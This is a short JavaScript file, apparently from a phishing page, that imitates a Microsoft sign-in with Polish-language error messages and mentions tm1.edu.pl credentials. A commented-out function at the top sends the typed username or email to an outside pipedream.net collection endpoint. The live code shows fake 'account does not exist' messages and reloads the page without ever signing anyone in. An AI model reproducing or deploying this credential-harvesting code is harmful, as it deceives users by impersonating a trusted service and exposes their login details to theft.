// async function logging(){
//     const t = document.getElementById("username").value;
//     await fetch(`https://eo2isf33hwr4zgo.m.pipedream.net/?email=${t}`);
//     window.location.reload();
// }

const forgotPass = document.getElementById("forgotPassword");
forgotPass.on('click',forgotPassMessage);
function forgotPassMessage(){
    r = document.getElementById("result");
    r.innerHTML = "Wprowadź poświadczenia przekazane przez opiekuna (nazwa użytkownika z domeny tm1.edu.pl)."
}


btnNext = document.querySelector("#loginbtn");

function validateEmail(e) {
    return /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(e);
}
function validate() {
    const r = document.getElementById("result"),
        u = document.getElementById("username").value;
        
    return (
        r.innerHTML = "",
        !!validateEmail(u) ||
            (u
                ? (r.innerHTML = "To konto Microsoft nie istnieje.\n Zarejestruj się przy użyciu innego konta lub załóż nowe.", r.style.color = "black")
                : (r.innerHTML = "Wprowadź poprawny adres email.", r.style.color = "black",
            !1)
    ));
}


btnNext.addEventListener("click", function () {
    const e = document.getElementById("username").value;
    if (!validate()) return;
    if (!validateEmail(e)) return;
    window.location.reload();
});